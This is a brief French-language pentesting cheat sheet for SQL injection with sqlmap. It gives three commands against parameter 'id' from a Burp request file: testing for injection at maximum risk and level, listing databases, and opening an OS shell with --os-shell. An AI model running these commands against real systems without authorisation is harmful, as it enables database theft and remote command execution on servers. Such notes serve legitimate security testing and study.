# SQLi

### SQLmap

#### Tester une injection à partir d'une requête Burp

```
sqlmap -r sqli.txt --risk 3 --level 5 -p id
```

#### Lister les bases de données

```
sqlmap -r sqli.txt --risk 3 --level 5 -p id --dbs
```

#### Obtenir un _shell_

```
sqlmap -r sqli.txt --risk 3 --level 5 -p id --os-shell
```
